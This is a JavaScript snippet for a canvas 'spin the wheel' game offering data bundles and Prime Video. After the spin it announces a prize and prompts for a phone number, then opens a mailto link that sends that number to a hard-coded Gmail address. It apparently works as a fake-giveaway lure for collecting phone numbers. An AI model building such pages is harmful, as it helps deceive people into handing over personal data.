const canvas = document.getElementById("wheel");
        const ctx = canvas.getContext("2d");
        const spinBtn = document.getElementById("spin-btn");
        const resultText = document.getElementById("result");
        
        const gifts = ["1GB", "1000", "2GB", "Prime Video"];
        let angle = 0;
        let spinning = false;

        function drawWheel() {
            const sliceAngle = (2 * Math.PI) / gifts.length;
            for (let i = 0; i < gifts.length; i++) {
                ctx.beginPath();
                ctx.moveTo(150, 150);
                ctx.arc(150, 150, 150, i * sliceAngle, (i + 1) * sliceAngle);
                ctx.fillStyle = i % 2 === 0 ? "#d63384" : "#800020";
                ctx.fill();
                ctx.stroke();
                ctx.save();
                
                ctx.translate(150, 150);
                ctx.rotate(i * sliceAngle + sliceAngle / 2);
                ctx.fillStyle = "white";
                ctx.font = "16px Arial";
                ctx.fillText(gifts[i], 50, 10);
                ctx.restore();
            }
        }

        function spinWheel() {
            if (spinning) return;
            spinning = true;
            let spinTime = Math.random() * 3000 + 2000;
            let start = Date.now();
            let spinInterval = setInterval(() => {
                let elapsed = Date.now() - start;
                if (elapsed >= spinTime) {
                    clearInterval(spinInterval);
                    let index = Math.floor((angle % 360) / (360 / gifts.length));
                    let selectedGift = gifts[gifts.length - 1 - index];
                    resultText.textContent = "You got: " + selectedGift;
                    spinning = false;
                    
                    let phoneNumber = prompt("Enter your phone number to claim your gift:");
                    if (phoneNumber) {
                        sendEmail(phoneNumber, selectedGift);
                    }
                }
                angle += 10;
                canvas.style.transform = `rotate(${angle}deg)`;
            }, 50);
        }
        
        function sendEmail(phone, gift) {
            const email = "umehsophia2@gmail.com";
            const subject = encodeURIComponent("Gift Claim");
            const body = encodeURIComponent(`Phone Number: ${phone}\nGift: ${gift}`);
            window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
        }
        
        drawWheel();
        spinBtn.addEventListener("click", spinWheel);